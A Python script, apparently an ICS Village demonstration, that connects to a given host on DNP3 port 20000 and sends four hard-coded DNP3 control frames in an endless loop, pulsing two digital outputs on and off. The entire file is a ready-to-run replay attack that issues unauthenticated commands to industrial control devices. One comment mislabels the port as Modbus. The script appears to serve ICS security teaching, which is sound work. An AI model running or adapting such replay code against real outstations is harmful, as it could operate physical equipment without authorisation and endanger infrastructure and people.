#!/usr/bin/env python
# Author: Stephen J. Hilt & Chris Sistrunk
#	Written for ICS Village to demonstrate
#	how replaying of DNP3 packets work. 
#
# For use with Python 3
#########################################################

import argparse
import socket
import sys
import time 


# Argument Checking
if (len(sys.argv) != 2): 
	print("USAGE: python ./py3_modturnt.py <host>")
	sys.exit()

# host is passed in via cli arguments
host=sys.argv[1]
# modbus port
port=20000

# make the socket and the connection to the host and port specified 
try:
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect((host,port))
except socket.error:
	print("\n||\n|| Connection unsuccessful...\n||\n")
	sys.exit()
# Set Digital Outputs 0/1 to Pulse On (Turn on lights)
turnt_0 = b'\x05\x64\x1a\xc4\x00\x04\x01\x00\xec\x47\xc5\xc4\x05\x0c\x01\x28\x01\x00\x00\x00\x03\x01\xe8\x03\x00\x00\x11\x21\xe8\x03\x00\x00\x00\x64\xe9'
turnt_1 = b'\x05\x64\x1a\xc4\x00\x04\x01\x00\xec\x47\xc7\xc6\x05\x0c\x01\x28\x01\x00\x01\x00\x03\x01\xe8\x03\x00\x00\x2b\x70\xe8\x03\x00\x00\x00\x64\xe9'
# Set Digital Outputs 0/1 to Pulse Off (Turn off lights)
turndown_0 = b'\x05\x64\x1a\xc4\x00\x04\x01\x00\xec\x47\xc6\xc5\x05\x0c\x01\x28\x01\x00\x00\x00\x04\x01\xe8\x03\x00\x00\xa3\x47\xe8\x03\x00\x00\x00\x64\xe9'
turndown_1 = b'\x05\x64\x1a\xc4\x00\x04\x01\x00\xec\x47\xc8\xc7\x05\x0c\x01\x28\x01\x00\x01\x00\x04\x01\xe8\x03\x00\x00\x42\x9b\xe8\x03\x00\x00\x00\x64\xe9'
# infinite loop to toggle lights 
while True:
	# send the packets
	sock.send(turnt_0)
	sock.recv(4096)
	time.sleep(1)
	sock.send(turnt_1)
	sock.recv(4096)
	time.sleep(1)
	sock.send(turndown_0)
	sock.recv(4096)
	time.sleep(1)
	sock.send(turndown_1)
	sock.recv(4096)
	time.sleep(1)

# close the socket.
sock.close()
sys.exit()
